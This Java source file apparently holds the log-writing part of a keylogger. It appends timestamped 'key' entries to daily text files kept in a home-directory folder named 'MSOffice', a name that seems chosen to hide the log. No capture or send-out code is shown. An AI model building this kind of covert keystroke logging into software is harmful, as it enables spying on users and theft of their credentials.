package com.mykey.log.mykey;

import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.time.LocalDate;
import java.time.LocalDateTime;

public class Writter
{
	private BufferedWriter fileWriter;
	private File inputFile;
	private static Writter writter = null;
	
	protected Writter() {
		inputFile = new File(System.getProperty("user.home"), "MSOffice\\" + LocalDate.now() + ".txt");
		try {
			fileWriter = new BufferedWriter(new java.io.FileWriter(inputFile, true));
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	public void write(String key) throws IOException
	{
		System.out.println("writting");
		fileWriter.append(LocalDateTime.now().getHour() + ":" + LocalDateTime.now().getMinute() + ":" + LocalDateTime.now().getSecond() + " - " + key);
		fileWriter.newLine();
		fileWriter.flush();
	}
	public void refresh() throws IOException
	{
		fileWriter.close();
		writter = new Writter();
	}


	public static Writter getInstance()
	{
		if (writter == null)
			writter = new Writter();
		return writter;
	}
}
